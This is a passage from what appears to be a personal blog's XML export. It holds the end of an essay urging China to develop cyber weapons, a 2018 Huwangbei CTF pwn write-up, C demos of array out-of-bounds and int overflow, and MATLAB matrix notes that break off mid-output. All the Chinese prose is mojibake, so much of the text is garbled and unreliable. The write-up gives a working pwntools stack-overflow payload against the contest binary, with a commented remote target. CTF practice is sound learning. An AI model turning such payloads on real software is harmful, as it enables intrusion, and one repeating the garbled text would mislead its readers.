Groupï¼‰æ‰€å¼€å‘çš„ç½‘ç»œæ­¦å™¨ï¼Œæ˜¯ä¸€æ¬¾å…¸å‹çš„ç½‘ç»œå†›ç«ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>æˆ‘è®¤ä¸ºç½‘ç»œå†›ç«éœ€è¦ä¸¥æ ¼æŠŠæ§ï¼Œå¦åˆ™åæœä¸å ªæƒ³è±¡ã€‚</strong> ç½‘ç»œå†›ç«å¤§å¤šç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªé«˜ç²¾å°–æŠ€æœ¯å›¢é˜Ÿç ”å‘è€Œæˆï¼Œè€Œå½“å‰ç½‘ç»œç©ºé—´å®‰å…¨æ³•å¾‹åˆ¶åº¦è–„å¼±ï¼Œä¸åƒç°å®ç”Ÿæ´»ä¸­ï¼Œé™åˆ¶æªæ¢°å†›ç«ï¼Œæœ‰ä¸¥æ ¼çš„æ³•å¾‹æ¥ä¿éšœæƒç›Šã€‚æ­£æ˜¯å¦‚æ­¤ï¼Œç½‘ç»œç©ºé—´ä¹Ÿå°±æˆä¸ºäº†è®¸è®¸å¤šå¤šé¾Œé¾Šè‹Ÿä¸”ï¼Œé»‘æš—é‚ªæ¶äº‹ç‰©çš„è—èº«ä¹‹åœ°ã€‚è€Œå½“ä»Šå„å›½çš„ç½‘ç»œç©ºé—´åŸºæœ¬ä¸Šæ˜¯æœ‰é˜²ç«å¢™ç›¸äº’éš”ç»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘ç»œç©ºé—´ä¹Ÿæœ‰å›½ç•Œä¹‹åˆ†ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶ï¼Œç½‘ç»œæˆ˜äº‰è¿™ç§ä½æˆæœ¬é«˜æ•ˆç›Šä¸”éšåŒ¿çš„æ”»å‡»æ–¹å¼ç†æ‰€å½“ç„¶åœ°å°±ä¸Šå‡åˆ°äº†å›½å®¶å±‚é¢ã€‚ä¸€æ—¦ç½‘ç»œå†›ç«æ°‘ç”¨åŒ–ç¨‹åº¦è¶Šæ¥è¶Šé«˜ï¼Œè€Œä¸”ç½‘ç»œå†›ç«çš„è‡ªåŠ¨åŒ–ç¨‹åº¦ä¹Ÿåœ¨å˜é«˜ï¼Œé‚£ä¹ˆå„ç§APTç»„ç»‡ä¹Ÿå°±ä¼šå˜å¾—æ›´åŠ å¼ºå¤§ï¼Œä¸ä»…ä»…æ˜¯APTç»„ç»‡ï¼Œå¾ˆéš¾æƒ³è±¡å‡ ä¹æ¯ä¸ªäººéƒ½ä¼šç”¨ç½‘ç»œå†›ç«æ¥è¿›è¡Œæ”»å‡»ï¼Œè€Œç½‘ç»œç©ºé—´å·²ç»å˜æˆæˆ˜ç«ä¹‹åœ°çš„åœºæ™¯ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ç½‘ç»œå†›ç«ä¸¥æ ¼æŠŠæ§çš„åŒæ—¶è¦å‘å±•è‡ªå·±çš„åŠ›é‡ã€‚æ®æŠ¥å‘Šäº†è§£åˆ°ï¼Œç¾å›½æ”¿åºœååˆ†é‡è§†ç½‘ç»œå†›ç«çš„ç ”å‘ï¼Œä»¥åŠåˆ©ç”¨ï¼Œæ‹¥æœ‰å±äºè‡ªå·±çš„ç½‘ç»œå†›ç«åº“ï¼Œä¸€ä¸ªæ˜¯NSAæ——ä¸‹çš„æ–¹ç¨‹å¼ç»„ç»‡ï¼Œå¦ä¸€ä¸ªæ®ç§°æ˜¯ç¾å›½ä¸­æƒ…å±€ï¼ˆCIAï¼‰ç›´å±çš„ç½‘ç»œæƒ…æŠ¥ä¸­å¿ƒã€‚æ ¹æ®æ–°åç¤¾æŠ¥é“ï¼Œæˆªæ­¢2016 å¹´åº•ï¼ŒCIAç›´å±çš„ç½‘ç»œæƒ…æŠ¥ä¸­å¿ƒæ‹¥æœ‰è¶…è¿‡5000åå‘˜å·¥ï¼Œæ€»å…±è®¾è®¡äº†è¶…è¿‡1000ä¸ªæœ¨é©¬ã€ç—…æ¯’å’Œå…¶ä»–â€œæ­¦å™¨åŒ–æ¶æ„ä»£ç â€ã€‚ è€Œ2017å¹´ï¼Œä»ç‰¹æœ—æ™®æ”¿åºœå¤§å¹…æé«˜å†›äº‹é¢„ç®—çš„æ”¿ç­–å€¾å‘çœ‹ï¼ŒCIAä»äº‹ç½‘ç»œæ­¦å™¨åº“å¼€å‘äººå‘˜æ•°é‡ä¼šå¤§å¹…å¢åŠ ã€‚ è€Œä¸Šè¿°çš„è¿™äº›ï¼Œéƒ½æ˜¯ç¾å›½çš„ç½‘ç»œå†›ç«åŠ›é‡ã€‚è¯•é—®ï¼Œå¦‚æœç¾å›½çš„ç½‘ç»œå†›ç«æˆ‘ä»¬éƒ½æ‰›ä¸ä½ï¼Œå¦‚ä½•å»æŠµæŠ—ç°å®ç”Ÿæ´»ä¸­çš„æˆ˜äº‰ï¼Ÿè¿™ä¸æ˜¯æœªæˆ˜å…ˆå®å—ï¼Ÿ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ€»ä¹‹ï¼Œç½‘ç»œå†›ç«çº§å·¥å…·å’Œæ™®é€šçš„æ¶æ„è½¯ä»¶ã€æ¸—é€å·¥å…·ç­‰ç»“åˆåï¼Œè®©å¾ˆå¤š æ”»å‡»è¡Œä¸ºåŒæ—¶å…·å¤‡é«˜çº§æ”»å‡»æ‰‹æ®µå’Œä¸€èˆ¬æ‰‹æ®µçš„ç‰¹æ€§ï¼Œå¢åŠ äº†çŠ¯ç½ªåˆ†å­çš„éšè”½æ€§ï¼Œä¹Ÿä¼šå¹²æ‰°ç›‘æµ‹è¯†åˆ«é«˜çº§å¨èƒã€‚ <strong>æ‰€ä»¥ï¼ŒæŸç§ç¨‹åº¦ä¸Šï¼Œç½‘ç»œå†›ç«æ°‘ç”¨åŒ–æŠ¬å‡äº†å®‰å…¨ç ”ç©¶è€…çš„é—¨æ§›ï¼Œå¢åŠ äº†APTçš„é˜²æ§éš¾åº¦ï¼Œç½‘ç»œå®‰å…¨ä¼ä¸šä»»é‡é“è¿œã€‚æˆ‘å›½åœ¨ç ”ç©¶å¦‚ä½•æŠµæŠ—è¿™ç§ç½‘ç»œå†›ç«æ”»å‡»çš„åŒæ—¶ï¼Œä¹Ÿåº”è¯¥ä¹ŸåŠ å¤§ç½‘ç»œå†›ç«çš„ç ”å‘åŠ›åº¦ï¼Œä¸€å‘³çš„é˜²å®ˆåªä¼šè®©è‡ªå·±å¤„äºè¢«åŠ¨çš„çŠ¶æ€ï¼Œåªæœ‰è‡ªå·±ä¹Ÿæ‹¥æœ‰èƒ½å¤Ÿå¨èƒåˆ°æ•Œæ–¹çš„åŠ›é‡ï¼Œæ‰èƒ½æŠ¤æˆ‘å›½å’Œå¹³å‘å±•ä¹‹è·¯ã€‚</strong></p></blockquote><hr><blockquote><p> ä»¥ä¸Šä»…å±ä¸ªäººè§‚ç‚¹ï¼Œè‹¥æœ‰ä¸ç¬¦ï¼Œè¿˜æœ›æ–§æ­£ã€‚</p></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://ti.360.net/blog/articles/apt-report-of-2017/" target="_blank" rel="noopener">2017ä¸­å›½é«˜çº§æŒç»­æ€§å¨èƒï¼ˆAPTï¼‰ç ”ç©¶æŠ¥å‘Š </a></p><p><a href="http://cpc.people.com.cn/xuexi/n1/2018/0817/c385476-30234135.html" target="_blank" rel="noopener">ä¹ è¿‘å¹³è°ˆç½‘ç»œå®‰å…¨ï¼šæ²¡æœ‰ç½‘ç»œå®‰å…¨å°±æ²¡æœ‰å›½å®¶å®‰å…¨</a></p><p><a href="https://www.doit.com.cn/p/251027.html" target="_blank" rel="noopener">è‚–æ–°å…‰ï¼šAPTçš„æœ¬è´¨æ˜¯å¤§å›½åšå¼ˆï¼Œæˆ‘ä»¬ç”Ÿä¸æ–¯ï¼Œé•¿ä¸æ–¯ï¼Œä¸ä¹‰ä¹‹è´¢æˆ‘ä»¬åˆ†æ–‡ä¸å–ï¼Œç¥–å®—ä¹‹åœ°æˆ‘ä»¬å¯¸åœŸä¸è®©</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ14-æŠ¤ç½‘æ¯</title>
      <link href="/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
      <url>/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote><p>â€‹    ä»Šå¤©æ‰“äº†æŠ¤ç½‘æ¯ï¼Œä»ä¹‹å‰çš„å¼ºç½‘æ¯ï¼Œåˆ°å›½èµ›ï¼Œåˆ°é“ä¸‰ï¼Œåˆ°Xmanï¼Œå†åˆ°ç½‘é¼æ¯ï¼Œæœ€ååˆ°äº†ä»Šå¤©çš„æŠ¤ç½‘æ¯ï¼Œç»å†çš„æ¯”èµ›å€’æ˜¯æŒºå¤šï¼Œåªæ˜¯è¿›æ­¥å¾®ä¹å…¶å¾®ï¼Œå®åœ¨æ±—é¢œï¼Œå¸Œæœ›æ¥ä¸‹æ¥èƒ½æœ‰è¾ƒå¤§çš„è¿›æ­¥ï¼</p><p>â€‹    write-upå‹é“¾ï¼š<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p><p>â€‹    æŠ¤ç½‘æ¯å…³é”®è¯ï¼š<code>python tornadoæ¨¡æ¿æ³¨å…¥(STTI)</code>,<code>æ¡ä»¶ç«äº‰</code>,<code>è¾£æ¡</code>,<code>æº¢å‡º</code>,<code>è‡ªé—­</code></p></blockquote><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote><p>â€‹    è¿™ç›¸å½“äºä»Šå¤©pwnçš„ç­¾åˆ°é¢˜ï¼Œç®€å•ä½†è¯¦ç»†åœ°å¤åŸä¸€ä¸‹ï¼š</p><p>â€‹    ç¬¬ä¸€æ­¥ï¼ŒIDAçœ‹ä¸€çœ‹ï¼Œé€»è¾‘ååˆ†ç®€å•ï¼Œç”šè‡³å¯ä»¥ç›´æ¥å†™payloadï¼š</p><p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p><p>â€‹    çªç ´ç‚¹æ˜¯é€šè¿‡readå‡½æ•°ï¼Œåœ¨bufå¤„è¿›è¡Œæº¢å‡ºï¼Œè¿›è€Œè¦†ç›–v7ï¼Œv8çš„å€¼ï¼Œè¾¾åˆ°elseçš„æ¡ä»¶ï¼Œå³v7==0x7FFFFFFFFFFFFFFF,v8==0.1ã€‚</p><p>â€‹    è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­è¡¨ç°çš„å½¢å¼æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œå®ƒä¸æ™®é€šçš„æ•´å‹ä¸åŒï¼Œä¼šåšå‡ºè½¬æ¢ï¼Œæ¯”è¾ƒæ™¦æ¶©ã€‚è¿™é‡Œç®€å•å†™ä¸€ä¸ªCè¯­è¨€ç¨‹åºçœ‹çœ‹0.1æ˜¯æ€ä¹ˆè¡¨ç¤ºçš„ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>â€‹    é€šè¿‡<code>gcc -o test test.c -z noexecstack -no-pie</code>è¿›è¡Œç¼–è¯‘ï¼Œç„¶åä½¿ç”¨gdbçœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p><p>â€‹    æ˜¾è€Œæ˜“è§ï¼Œ0.1æ˜¯ç”¨0x3fb999999999999aè¡¨ç¤ºçš„ï¼Œé‚£ä¹ˆåœ¨æ¥ä¸‹æ¥çš„expä¸­å°±åº”è¯¥è¿™æ ·å†™:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>payload<span class="token operator">=</span><span class="token string">""</span>payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cmd="cat flag"</span><span class="token comment" spellcheck="true">#print p.recv()</span><span class="token comment" spellcheck="true">#print payload</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p.send(cmd)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print p.recv()</span></code></pre><p>è¿è¡Œexpï¼Œæ•ˆæœå›¾ï¼š</p><p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p></blockquote><h2 id="éªŒè¯æ•°ç»„è¶Šç•Œ"><a href="#éªŒè¯æ•°ç»„è¶Šç•Œ" class="headerlink" title="éªŒè¯æ•°ç»„è¶Šç•Œ"></a>éªŒè¯æ•°ç»„è¶Šç•Œ</h2><blockquote><p>â€‹    å†™ä¸€æ®µç®€å•çš„ä»£ç æ¥éªŒè¯ä¸€ä¸‹ï¼Œæ–°ç”Ÿç»å¸¸ä¼šçŠ¯é”™çš„æ•°ç»„è¶Šç•Œé—®é¢˜</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>â€‹    è¿è¡Œç»“æœï¼š</p><p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p><p>â€‹    å› ä¸ºa[4]å¹¶ä¸åœ¨æˆ‘ä»¬å®šä¹‰çš„æ•°ç»„èŒƒå›´ï¼Œå±äºæ•°ç»„è¶Šç•Œï¼Œæ¥ä¸‹æ¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹å…·ä½“æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p><p>â€‹    è€Œå°±åœ¨0ï¼Œ1ï¼Œ2ï¼Œ3åé¢æ˜¯ä¸æ˜¯æˆ‘ä»¬è¿è¡Œè¾“å‡ºçš„é‚£ä¸ªå€¼å‘¢ï¼Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡a[4]è®¿é—®çš„å¹¶ä¸æ˜¯æˆ‘ä»¬æ›¾ç»å®šä¹‰è¿‡çš„å…ƒç´ ï¼Œè€Œæ˜¯ç¨‹åºè¿è¡Œä¸­çš„äº§ç”Ÿçš„éšæœºå€¼ï¼Œå¦‚å‡½æ•°åœ°å€ç­‰ã€‚</p></blockquote><h2 id="éªŒè¯intæº¢å‡º"><a href="#éªŒè¯intæº¢å‡º" class="headerlink" title="éªŒè¯intæº¢å‡º"></a>éªŒè¯intæº¢å‡º</h2><blockquote><p>â€‹    åœ¨64ä½ç³»ç»Ÿä¸­ <code>int</code>å‹å˜é‡æ˜¯å ç”¨4ä¸ªå­—èŠ‚å¤§å°çš„ï¼Œè€Œ4ä¸ªå­—èŠ‚ç”¨16è¿›åˆ¶è¡¨ç¤ºå°±æ˜¯<code>0x00000000-0xffffffff</code>ï¼Œå¹¶ä¸”æ­£æ•°è´Ÿæ•°éƒ½åœ¨å…¶ä¸­ï¼Œè€Œè´Ÿæ•°æ˜¯ç”¨è¡¥ç è¡¨ç¤ºçš„ï¼Œ<code>0x7fffffff&lt;=&gt;2147483647</code>ï¼Œ<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>ã€‚</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"å››ä¸ªå­—èŠ‚æœ€å¤§å€¼0x7fffffffåè¿›åˆ¶ä¸º:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä½ æƒ³è¦èµ‹ç»™intçš„å€¼:\n"</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿è¡Œç»“æœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" class="lazyload"></p><p>â€‹    æœä¸å…¶ç„¶ï¼Œæˆ‘ä»¬èµ‹ç»™intçš„2147483648å˜æˆäº†è´Ÿæ•°ï¼Œ-2147483648ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" class="lazyload"></p></blockquote><blockquote><p>have a good weekend everybody!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°å­¦å»ºæ¨¡-day5</title>
      <link href="/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/"/>
      <url>/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°å­¦å»ºæ¨¡-day5-çº¿æ€§ä»£æ•°"><a href="#æ•°å­¦å»ºæ¨¡-day5-çº¿æ€§ä»£æ•°" class="headerlink" title="æ•°å­¦å»ºæ¨¡_day5 - çº¿æ€§ä»£æ•°"></a>æ•°å­¦å»ºæ¨¡_day5 - çº¿æ€§ä»£æ•°</h1><blockquote><p>â€‹    çº¿æ€§ä»£æ•°ç›¸ä¿¡å¤§å®¶éƒ½å­¦è¿‡å“’ï¼ŒåŸºæœ¬æ˜¯å¤§å­¦çš„ç†ç§‘å¿…ä¿®è¯¾ï¼Œè€Œçº¿æ€§ä»£æ•°å¸¸ç”¨äºå·¥ç¨‹æ•°å­¦ï¼Œè‡ªç„¶è€Œç„¶å°±å’Œæ•°å­¦å»ºæ¨¡æœ‰å¾ˆå¤§çš„å…³ç³»å•¦ï¼Œä»Šå¤©å­¦ä¹ ä¸€ä¸‹ç”¨matlabåšä¸€äº›ç›¸å…³çš„çº¿æ€§ä»£æ•°å­¦ä¹ ã€‚</p></blockquote><h2 id="çŸ©é˜µ"><a href="#çŸ©é˜µ" class="headerlink" title="çŸ©é˜µ"></a>çŸ©é˜µ</h2><blockquote><p>â€‹    MATLAB æä¾›äº†è®¸å¤šå‡½æ•°ï¼Œç”¨äºåˆ›å»ºå„ç§ç±»å‹çš„çŸ©é˜µã€‚ä¾‹å¦‚ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨åŸºäºå¸•æ–¯å¡ä¸‰è§’å½¢çš„é¡¹åˆ›å»ºä¸€ä¸ªå¯¹ç§°çŸ©é˜µï¼š </p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#è™šçº¿ä¸‹ä¸ºè¿è¡Œç»“æœA <span class="token operator">=</span>       <span class="token number">1</span>     <span class="token number">1</span>     <span class="token number">1</span>       <span class="token number">1</span>     <span class="token number">2</span>     <span class="token number">3</span>       <span class="token number">1</span>     <span class="token number">3</span>     <span class="token number">6</span></code></pre><blockquote><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªéå¯¹ç§°<em>å¹»æ–¹çŸ©é˜µ</em>ï¼Œå®ƒçš„è¡Œæ€»å’Œä¸åˆ—æ€»å’Œç›¸ç­‰ï¼š </p></blockquote><pre class=" language-matlab"><code class="language-matlab">B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#è™šçº¿ä¸‹ä¸ºè¿è¡Œç»“æœB <span class="token operator">=</span>       <span class="token number">8</span>     <span class="token number">1</span>     <span class="token number">6</span>       <span class="token number">3</span>     <span class="token number">5</span>     <span class="token number">7</span>       <span class="token number">4</span>     <span class="token number">9</span>     <span class="token number">2</span></code></pre><blockquote><p>â€‹    è¿™é‡Œæˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹<code>randi()</code>å‡½æ•°ï¼Œrandiçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ç”¨äºæè¿°äº§ç”ŸçŸ©é˜µçš„æ•°å€¼èŒƒå›´ï¼Œåé¢çš„ä¸¤ä¸ªå‚æ•°æ˜¯è¡Œåˆ—æ•°ï¼Œä¾‹å¦‚ï¼š</p></blockquote><pre class=" language-matlab"><code class="language-matlab">a <span class="token operator">=</span> <span class="token function">randi</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#è™šçº¿ä¸‹ä¸ºè¿è¡Œç»“æœa <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">13</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">9</span>    <span class="token number">19</span>     <span class="token number">2</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">19</span>     <span class="token number">3</span>     <span class="token number">6</span>     <span class="token number">4</span>    <span class="token number">17</span>    <span class="token number">16</span>    <span class="token number">19</span>    <span class="token number">11</span>    <span class="token number">20</span>     <span class="token number">3</span>    <span class="token number">20</span></code></pre><h2 id="çŸ©é˜µçš„è½¬ç½®"><a href="#çŸ©é˜µçš„è½¬ç½®" class="headerlink" title="çŸ©é˜µçš„è½¬ç½®"></a>çŸ©é˜µçš„è½¬ç½®</h2><blockquote><p>â€‹    æˆ‘ä»¬çŸ¥é“çŸ©é˜µæœ‰å®æ•°çŸ©é˜µå’Œå¤æ•°çŸ©é˜µä¸¤ç§ï¼Œå¯¹äºå®çŸ©é˜µï¼Œ<em>è½¬ç½®</em>è¿ç®—å¯¹ aij å’Œ aji è¿›è¡Œäº¤æ¢ã€‚å¯¹äºå¤çŸ©é˜µï¼Œè¿˜è¦è€ƒè™‘æ˜¯å¦ç”¨æ•°ç»„ä¸­å¤æ•°é¡¹çš„å¤å…±è½­æ¥å½¢æˆ<em>å¤å…±è½­è½¬ç½®</em>ã€‚MATLAB ä½¿ç”¨æ’‡å·è¿ç®—ç¬¦ (<code>&#39;</code>) æ‰§è¡Œå¤å…±è½­è½¬ç½®ï¼Œä½¿ç”¨ç‚¹æ’‡å·è¿ç®—ç¬¦ (<code>.&#39;</code>) æ‰§è¡Œæ— å…±è½­çš„è½¬ç½®ã€‚å¯¹äºåŒ…å«æ‰€æœ‰å®æ•°å…ƒç´ çš„çŸ©é˜µï¼Œè¿™ä¸¤ä¸ªè¿ç®—ç¬¦è¿”å›ç›¸åŒç»“æœã€‚ </p><p>å®çŸ©é˜µè½¬ç½®ç¤ºä¾‹ï¼š</p></blockquote><pre class=" language-matlab"><code class="language-matlab">#è¿™é‡Œæ‹¿ä¸Šä¸€æ­¥çš„aå€¼åšæµ‹è¯•a<span class="token operator">'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span 